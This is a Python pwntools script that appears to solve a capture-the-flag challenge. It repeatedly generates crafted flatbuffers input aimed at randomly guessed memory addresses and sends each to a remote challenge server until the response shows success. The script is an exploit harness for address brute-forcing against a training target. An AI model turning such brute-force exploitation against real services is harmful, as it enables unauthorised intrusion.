
import os
import pwn
import sys
import flatbuffers
import Chunk
import FwHeader
import File
import random

pwn.context.log_level = 'error'


def generate_input_cpp(addr):
    os.system(f'./generate_input {hex(addr)}')

    with open('input', mode='rb') as file:
        return file.read()



base = 0x7fffffffd000
# base = 0x7fffffff0000
# i = 0x10000
# i = 0xd950

sum = 0
round = 2000
for i in range(round):
    k = 0 
    while True:
        if random.randrange(0x1000) == 0x41c:
            sum += k
            break
        k += 1

print(f'avg: {sum/round}')

i = 0x0
while i < 0x1000:

    sys.stdout.write(f'\r{hex(i)} ')
    sys.stdout.flush()



    # addr = 0x41c020
    addr = 0x0000020 + ((random.randrange(0x1000)) << 12);
    addr += 0x1000000


    fileContent = generate_input_cpp(addr)

    with open('input', mode='rb') as file:
        fileContent = file.read()

        # conn = pwn.process('./me', stderr=pwn.PIPE)
        conn = pwn.remote('challenges.crysys.hu', 5010)

        r = conn.recvline().decode('ascii')
        # print(r)
        conn.sendline(str(len(fileContent)))
        r = conn.recvline().decode('ascii')
        # print(r)
        conn.send(fileContent)
        r = conn.recvall().decode('ascii')
        for line in r.split('\n'):
            if line == '[+ME] TraceHub loading config.':
                pass
            elif line.strip() == '':
                pass
            else :
                print()
        print(r)
        conn.close()
        if 'cd21' in r:
            break


    # if addr == 0x41c020:
    #     print(i)
    #     break

    i  += 1